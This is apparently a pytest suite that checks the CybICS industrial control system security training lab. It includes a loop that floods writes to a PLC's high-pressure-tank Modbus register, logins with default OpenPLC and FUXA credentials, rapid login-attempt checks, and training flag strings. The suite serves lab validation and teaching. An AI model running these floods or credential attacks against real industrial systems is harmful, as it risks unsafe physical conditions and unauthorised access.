"""
CybICS Training Test Suite

This test suite validates the training exercises and attack scenarios in CybICS.
It tests defensive security concepts and validates proper system responses to attacks.

Tests include:
- Flood and overwrite attacks on Modbus registers
- System resilience validation
- Attack detection and response verification
"""

import pytest
import time
import os
import requests
from pathlib import Path
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ConnectionException, ModbusException
from dotenv import load_dotenv

# Test Configuration
# Allow SERVER_IP to be overridden via environment variable for remote testing
# Default to localhost for consistency and isolation
SERVER_IP = os.getenv('TEST_SERVER_IP', '127.0.0.1')
MODBUS_PORT = 502
CONNECTION_TIMEOUT = 10
HPT_REGISTER = 1126  # High Pressure Tank register address

# Web service ports
OPENPLC_PORT = 8080
FUXA_PORT = 1881


# ===============================================================================
# Flood & Overwrite Training Tests
# ===============================================================================

class TestFloodOverwrite:
    """
    Tests for the Flood & Overwrite training exercise.

    This training demonstrates how an attacker can continuously flood a PLC
    with malicious Modbus commands to override register values, which can
    lead to unsafe operating conditions in industrial systems.
    """

    @pytest.fixture
    def modbus_client(self):
        """
        Fixture to create and manage Modbus TCP client connection.

        Yields:
            ModbusTcpClient: Configured Modbus TCP client instance
        """
        client = ModbusTcpClient(
            host=SERVER_IP,
            port=MODBUS_PORT,
            timeout=CONNECTION_TIMEOUT
        )
        yield client
        try:
            client.close()
        except Exception:
            pass

    def test_modbus_connection_available(self, modbus_client):
        """
        Test that Modbus TCP connection is available for flood attack training.

        This validates the prerequisite that the OpenPLC server is accessible
        before attempting the flood attack training.
        """
        connection_successful = modbus_client.connect()
        assert connection_successful, (
            f"Failed to connect to Modbus server at {SERVER_IP}:{MODBUS_PORT}. "
            f"Ensure OpenPLC is running and accessible."
        )
        assert modbus_client.is_socket_open(), "Modbus connection appears closed"

    def test_hpt_register_readable(self, modbus_client):
        """
        Test that the HPT (High Pressure Tank) register can be read.

        Validates that register 1126 (HPT) is accessible for reading,
        which is necessary for the flood attack training scenario.
        """
        if not modbus_client.is_socket_open():
            assert modbus_client.connect(), "Failed to connect to Modbus server"

        try:
            result = modbus_client.read_holding_registers(
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )

            assert result is not None, "No response from Modbus server"
            assert not result.isError(), f"Error reading HPT register: {result}"
            assert hasattr(result, 'registers'), "Response missing register data"
            assert len(result.registers) == 1, "Expected 1 register in response"

            hpt_value = result.registers[0]
            assert hpt_value is not None, "HPT register value is None"
            assert isinstance(hpt_value, int), f"HPT value should be int, got {type(hpt_value)}"

        except ModbusException as e:
            pytest.fail(f"Modbus exception reading HPT register: {e}")

    def test_hpt_register_writable(self, modbus_client):
        """
        Test that the HPT register can be written to.

        Validates that register 1126 (HPT) is writable, which is the
        target of the flood attack in the training scenario.

        Note: The HPT value may be overwritten by the PLC logic quickly,
        so we just verify the write succeeds, not persistence.
        """
        if not modbus_client.is_socket_open():
            assert modbus_client.connect(), "Failed to connect to Modbus server"

        test_value = 50

        try:
            # Read original value
            read_result = modbus_client.read_holding_registers(
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )
            assert not read_result.isError(), f"Error reading HPT register: {read_result}"

            # Write test value - just verify write succeeds
            write_result = modbus_client.write_register(
                address=HPT_REGISTER,
                value=test_value,
                device_id=1
            )

            assert write_result is not None, "No response from write operation"

            if write_result.isError():
                error_msg = str(write_result)
                if "Connection unexpectedly closed" in error_msg or "Connection" in error_msg:
                    pytest.skip(f"Server closed connection on write - may not support writes: {error_msg}")
                else:
                    pytest.fail(f"Error writing to HPT register: {write_result}")

            # Write operation succeeded - this is sufficient for the test
            # Note: We don't verify the value persists because the PLC logic
            # is continuously updating this register based on the simulation

        except ConnectionException as e:
            pytest.skip(f"Connection issue during write test: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during write test: {e}")

    def test_flood_attack_simulation(self, modbus_client):
        """
        Test a brief simulation of the flood attack.

        Performs a short burst of rapid writes to the HPT register to simulate
        the flood attack behavior described in the training. This validates that:
        1. Rapid writes are possible (demonstrating vulnerability)
        2. The system accepts continuous write commands
        3. The attack pattern is executable

        Note: This is a brief test simulation (1 second), not a full attack.
        """
        if not modbus_client.is_socket_open():
            assert modbus_client.connect(), "Failed to connect to Modbus server"

        flood_value = 10
        flood_duration = 1.0  # seconds
        write_delay = 0.001  # 1ms between writes (same as training script)

        try:
            # Read original value to restore later
            read_result = modbus_client.read_holding_registers(
                address=HPT_REGISTER,
                count=1,
                device_id=1
            )
            assert not read_result.isError(), "Cannot read original HPT value"
            original_value = read_result.registers[0]

            # Perform flood simulation
            start_time = time.time()
            write_count = 0
            failed_writes = 0

            while (time.time() - start_time) < flood_duration:
                try:
                    result = modbus_client.write_register(
                        address=HPT_REGISTER,
                        value=flood_value,
                        device_id=1
                    )

                    if result and not result.isError():
                        write_count += 1
                    else:
                        failed_writes += 1

                    time.sleep(write_delay)

                except Exception as e:
                    failed_writes += 1
                    # Continue flooding despite errors
                    if not modbus_client.is_socket_open():
                        if not modbus_client.connect():
                            break

            elapsed_time = time.time() - start_time

            # Restore original value
            if modbus_client.is_socket_open():
                modbus_client.write_register(
                    address=HPT_REGISTER,
                    value=original_value,
                    device_id=1
                )

            # Validate flood attack was possible
            assert write_count > 0, "No successful writes during flood simulation"

            writes_per_second = write_count / elapsed_time

            # Should achieve at least 100 writes/second with 1ms delay
            assert writes_per_second >= 100, (
                f"Flood attack rate too low: {writes_per_second:.1f} writes/sec. "
                f"Expected at least 100 writes/sec for effective flooding."
            )

            # Log results for analysis
            print(f"\nFlood Attack Simulation Results:")
            print(f"  Duration: {elapsed_time:.2f} seconds")
            print(f"  Successful writes: {write_count}")
            print(f"  Failed writes: {failed_writes}")
            print(f"  Write rate: {writes_per_second:.1f} writes/second")
            print(f"  Success rate: {write_count/(write_count+failed_writes)*100:.1f}%")

        except ConnectionException as e:
            pytest.skip(f"Connection issue during flood simulation: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during flood simulation: {e}")

    def test_hpt_register_persistence(self, modbus_client):
        """
        Test that HPT register can be written multiple times rapidly.

        This validates that the flood attack can continuously write to the HPT
        register, which is the key capability needed for the attack to work.

        Note: We don't expect values to persist because the PLC logic continuously
        updates this register. Instead, we verify that rapid successive writes
        are accepted by the server.
        """
        if not modbus_client.is_socket_open():
            assert modbus_client.connect(), "Failed to connect to Modbus server"

        test_values = [10, 50, 100, 200]
        successful_writes = 0

        try:
            for test_value in test_values:
                # Write value
                write_result = modbus_client.write_register(
                    address=HPT_REGISTER,
                    value=test_value,
                    device_id=1
                )

                if write_result.isError():
                    pytest.skip(f"Write operations not supported: {write_result}")

                successful_writes += 1

                # Small delay between writes
                time.sleep(0.01)

            # Verify we successfully wrote all test values
            assert successful_writes == len(test_values), (
                f"Only {successful_writes}/{len(test_values)} writes succeeded"
            )

        except ConnectionException as e:
            pytest.skip(f"Connection issue during write test: {e}")
        except ModbusException as e:
            pytest.fail(f"Modbus exception during write test: {e}")


# ===============================================================================
# Password Attack Training Tests
# ===============================================================================

class TestPasswordAttack:
    """
    Tests for the Password Attack training exercise.

    This training demonstrates dictionary/brute force attacks against
    web authentication systems in industrial control systems.
    """

    def test_openplc_login_page_accessible(self):
        """
        Test that OpenPLC login page is accessible.

        Validates that the OpenPLC web interface is available for
        password attack testing.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        try:
            response = requests.get(url, timeout=5)
            assert response.status_code == 200, (
                f"OpenPLC login page returned status {response.status_code}"
            )
            assert 'login' in response.text.lower(), (
                "OpenPLC login page missing login form"
            )
        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_openplc_invalid_credentials_rejected(self):
        """
        Test that OpenPLC rejects invalid credentials.

        Validates that the authentication system is working and
        rejects wrong passwords.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        # Test with clearly invalid credentials
        payload = {
            'username': 'admin',
            'password': 'definitely_wrong_password_12345'
        }

        try:
            response = requests.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=5,
                allow_redirects=False
            )

            # Should not redirect to dashboard (302) or return success (200 with dashboard)
            if response.status_code == 302:
                assert '/login' in response.headers.get('Location', ''), (
                    "Invalid credentials were accepted"
                )
            else:
                # Check response doesn't contain dashboard elements
                assert 'logout' not in response.text.lower(), (
                    "Invalid credentials appear to have been accepted"
                )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_openplc_valid_credentials_accepted(self):
        """
        Test that OpenPLC accepts valid credentials.

        Validates that the default credentials work, which is important
        for the training scenario (demonstrating weak passwords).
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        # Default OpenPLC credentials (commonly known)
        payload = {
            'username': 'openplc',
            'password': 'openplc'
        }

        try:
            response = requests.post(
                url,
                data=payload,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=5,
                allow_redirects=True
            )

            # Should successfully log in
            assert response.status_code == 200, (
                f"Login failed with status {response.status_code}"
            )

            # Check for indicators of successful login
            assert any(indicator in response.text.lower() for indicator in
                      ['logout', 'dashboard', 'programs', 'hardware']), (
                "Login appears to have failed - no dashboard elements found"
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to OpenPLC at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to OpenPLC at {url} timed out")

    def test_fuxa_api_accessible(self):
        """
        Test that FUXA web interface is accessible.

        Validates that the FUXA service is running and available for
        password attack testing.
        """
        # Test main FUXA page first
        url = f"http://{SERVER_IP}:{FUXA_PORT}/"

        try:
            response = requests.get(url, timeout=5)
            assert response.status_code == 200, (
                f"FUXA web interface returned status {response.status_code}"
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_fuxa_invalid_credentials_rejected(self):
        """
        Test that FUXA rejects invalid credentials.

        Validates that the authentication system is working and
        rejects wrong passwords.
        """
        url = f"http://{SERVER_IP}:{FUXA_PORT}/api/signin"

        # Test with clearly invalid credentials
        payload = {
            'username': 'admin',
            'password': 'definitely_wrong_password_12345'
        }

        try:
            response = requests.post(
                url,
                json=payload,
                headers={'Content-Type': 'application/json'},
                timeout=5
            )

            # Should return error
            assert response.status_code in [401, 403, 400], (
                f"Expected auth error status, got {response.status_code}"
            )

            # Check response indicates error
            try:
                data = response.json()
                assert 'error' in str(data).lower() or 'token' not in data, (
                    "Invalid credentials appear to have been accepted"
                )
            except:
                # Response might not be JSON, that's okay
                pass

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_fuxa_valid_credentials_accepted(self):
        """
        Test that FUXA accepts valid credentials.

        Validates that the default credentials work, which is important
        for the training scenario (demonstrating weak passwords).
        """
        url = f"http://{SERVER_IP}:{FUXA_PORT}/api/signin"

        # Try multiple known FUXA default credentials
        credentials_to_try = [
            {'username': 'operator', 'password': 'operator'},
            {'username': 'viewer', 'password': 'viewer'},
            {'username': 'admin', 'password': 'admin'}
        ]

        successful_login = False

        try:
            for payload in credentials_to_try:
                response = requests.post(
                    url,
                    json=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )

                # Check if login succeeded
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data.get('status') == 'success' and 'token' in data.get('data', {}):
                            successful_login = True
                            break
                    except ValueError:
                        pass

            assert successful_login, (
                "None of the default FUXA credentials worked. Tried: " +
                ", ".join([f"{c['username']}/{c['password']}" for c in credentials_to_try])
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Could not connect to FUXA at {url}")
        except requests.exceptions.Timeout:
            pytest.fail(f"Connection to FUXA at {url} timed out")

    def test_password_attack_rate_limiting(self):
        """
        Test rapid authentication attempts (password attack simulation).

        Validates that multiple rapid login attempts can be made,
        which is necessary for dictionary/brute force attacks.
        This also checks if any rate limiting is in place.
        """
        url = f"http://{SERVER_IP}:{OPENPLC_PORT}/login"

        attempts = 5
        successful_attempts = 0

        try:
            for i in range(attempts):
                payload = {
                    'username': 'admin',
                    'password': f'test_password_{i}'
                }

                response = requests.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=5,
                    allow_redirects=False
                )

                # Just verify we can make the request
                if response.status_code in [200, 302, 401, 403]:
                    successful_attempts += 1

                # Small delay between attempts
                time.sleep(0.1)

            # Should be able to make all attempts
            assert successful_attempts == attempts, (
                f"Only {successful_attempts}/{attempts} login attempts succeeded. "
                f"Server may be blocking rapid requests."
            )

        except requests.exceptions.ConnectionError:
            pytest.fail(f"Connection lost during rapid login attempts")
        except requests.exceptions.Timeout:
            pytest.fail(f"Timeout during rapid login attempts")


# ===============================================================================
# Training Exercise Validation
# ===============================================================================

def test_flood_attack_script_exists():
    """
    Verify that the flood attack training script exists.

    Ensures the training materials are properly set up in the repository.
    """
    script_path = Path(__file__).parent.parent / 'training' / 'flood_overwrite' / 'flooding_hpt.py'
    assert script_path.exists(), (
        f"Flood attack training script not found at {script_path}"
    )

    # Verify script is readable and contains expected content
    content = script_path.read_text()
    assert 'ModbusTcpClient' in content, "Script missing Modbus client import"
    assert 'write_register' in content, "Script missing write_register call"
    assert '1126' in content, "Script missing HPT register address (1126)"


def test_flood_attack_readme_exists():
    """
    Verify that the flood attack training README exists.

    Ensures training documentation is available for users.
    """
    readme_path = Path(__file__).parent.parent / 'training' / 'flood_overwrite' / 'README.md'
    assert readme_path.exists(), (
        f"Flood attack training README not found at {readme_path}"
    )

    # Verify README contains expected sections
    content = readme_path.read_text()
    assert 'Flood' in content or 'flood' in content, "README missing flood attack content"
    assert 'CybICS(flood_attack_successful)' in content, "README missing flag information"


def test_dev_env_file_exists():
    """
    Verify that .dev.env file exists for training configuration.

    The flood attack script requires this file to get the DEVICE_IP.
    Note: Tests always run against localhost, but the training script
    uses .dev.env for flexible targeting.
    """
    dev_env_path = Path(__file__).parent.parent / '.dev.env'

    if not dev_env_path.exists():
        pytest.skip(
            f".dev.env file not found at {dev_env_path}. "
            f"This file is needed for training scripts to locate the device."
        )

    # Verify DEVICE_IP is set
    content = dev_env_path.read_text()
    assert 'DEVICE_IP' in content, ".dev.env missing DEVICE_IP configuration"


def test_password_attack_readme_exists():
    """
    Verify that the password attack training README exists.

    Ensures training documentation is available for users.
    """
    readme_path = Path(__file__).parent.parent / 'training' / 'password_attack' / 'README.md'
    assert readme_path.exists(), (
        f"Password attack training README not found at {readme_path}"
    )

    # Verify README contains expected sections
    content = readme_path.read_text()
    assert 'password' in content.lower() or 'Password' in content, (
        "README missing password attack content"
    )
    assert 'OpenPLC' in content, "README missing OpenPLC attack information"
    assert 'FUXA' in content, "README missing FUXA attack information"
    assert 'CybICS(0penPLC)' in content, "README missing OpenPLC flag"
    assert 'CybICS(FU##A)' in content, "README missing FUXA flag"
